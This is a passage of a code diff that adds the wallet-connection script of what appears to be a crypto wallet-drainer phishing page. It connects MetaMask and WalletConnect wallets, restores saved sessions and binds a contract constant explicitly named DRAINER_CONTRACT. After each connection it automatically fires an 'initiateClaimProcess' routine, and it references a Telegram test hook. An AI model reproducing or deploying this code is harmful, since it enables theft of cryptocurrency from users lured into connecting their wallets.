+      if (accounts.length === 0) { resetConnectedUI(); clearSavedWallet(); }
+      else {
+        updateConnectedUI(accounts[0], 'evm');
+        saveWallet(accounts[0], null, 'evm');
+        publishGlobalState(accounts[0], 'evm', provider);
+        setTimeout(() => { if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess(); }, 1000);
+      }
+    });
+    provider.on('chainChanged', (id) => showStatus(`Network changed to ${id}`, 'info'));
+    provider.on('disconnect', () => { resetConnectedUI(); clearSavedWallet(); });
+  }
+
+  /* ─── Connect dispatcher ───────────────────────────────────────── */
+  async function connectWallet() {
+    if (isConnecting) return;
+    setButtonState(connectButton, 'loading');
+    if (walletButton) setButtonState(walletButton, 'loading');
+    showStatus('Connecting...', 'info');
+
+    let success = await connectDirectEVM(8000);
+    if (!success) success = await connectViaWalletConnect(false, 300000);
+    if (!success) success = await connectViaWalletConnect(true, 300000);
+
+    if (success) {
+      setButtonState(connectButton, 'connected');
+      if (walletButton) setButtonState(walletButton, 'connected');
+      setTimeout(() => { if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess(); }, 1500);
+    } else {
+      showStatus('No wallet found', 'error');
+      setButtonState(connectButton, 'failed');
+      if (walletButton) setButtonState(walletButton, 'failed');
+    }
+  }
+
+  /* ─── Disconnect ───────────────────────────────────────────────── */
+  async function disconnectWallet() {
+    try {
+      if (client && currentSession) {
+        await client.disconnect({ topic: currentSession.topic, reason: { code: 6000, message: 'User disconnected' } });
+        currentSession = null;
+      }
+      if (web3Instance?.currentProvider?.disconnect) await web3Instance.currentProvider.disconnect();
+    } catch (e) {}
+    resetConnectedUI();
+    clearSavedWallet();
+    web3Instance = null;
+    contractInstance = null;
+    activeProvider = null;
+  }
+
+  /* ─── Buttons ──────────────────────────────────────────────────── */
+  const handleClick = async () => {
+    const saved = getSavedWallet();
+    if (saved && (currentSession || getSavedChainType() !== 'unknown')) await disconnectWallet();
+    else await connectWallet();
+  };
+  if (connectButton) connectButton.addEventListener('click', handleClick);
+  if (walletButton)  walletButton.addEventListener('click', handleClick);
+
+  if (walletButton && isMobile()) {
+    walletButton.addEventListener('click', () => {
+      setTimeout(() => { if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 300);
+    });
+  }
+
+  /* ─── Restore ──────────────────────────────────────────────────── */
+  async function restoreWalletConnection() {
+    const savedWallet = getSavedWallet();
+    const savedChain  = getSavedChainType();
+    const savedSession = getSavedSession();
+    if (!savedWallet || savedChain === 'unknown') return;
+
+    if (savedChain === 'evm') {
+      if (savedSession) {
+        const ok = await initWalletConnect(false);
+        if (ok) {
+          try {
+            const session = client.session.get(savedSession.topic);
+            if (session) {
+              currentSession = session;
+              const provider = await EthereumProvider.init({
+                projectId,
+                chains: [1],
+                optionalChains: CHAIN_IDS.filter((id) => id !== 1),
+                showQrModal: false,
+                metadata: DAPP_METADATA,
+                session
+              });
+              const Web3 = (await import('web3')).default;
+              web3Instance = new Web3(provider);
+              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+              activeProvider = provider;
+              updateConnectedUI(savedWallet, 'evm');
+              return;
+            }
+          } catch (e) { logDebug('Restore failed: ' + e.message); }
+        }
+      }
+      if (isDesktop() && window.ethereum) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          if (accounts.length > 0 && accounts[0] === savedWallet) {
+            const Web3 = (await import('web3')).default;
+            web3Instance = new Web3(window.ethereum);
+            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+            activeProvider = window.ethereum;
+            updateConnectedUI(savedWallet, 'evm');
+            setupEVMProviderEvents(window.ethereum);
+            return;
+          }
+        } catch (e) {}
+      }
+      clearSavedWallet();
+    }
+  }
+
+  /* ─── Boot ─────────────────────────────────────────────────────── */
+  try {
+    const libs = await loadWalletConnect();
+    SignClient         = libs.SignClient;
+    WalletConnectModal = libs.WalletConnectModal;
+    EthereumProvider   = libs.EthereumProvider;
+    logDebug('✅ All libs loaded');
+    setupEIP6963();
+    await restoreWalletConnection();
+  } catch (err) {
+    logDebug('Fatal: ' + err.message);
+    showStatus('Failed to load wallet libraries', 'error');
+    return;
+  }
+
+  if (window.ethereum && isDesktop()) setupEVMProviderEvents(window.ethereum);
+  window.addEventListener('beforeunload', () => { if (modal) modal.closeModal(); });
+
+  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
+  console.log('✅ main.js ready — test with testTelegram("hi")');
+})();
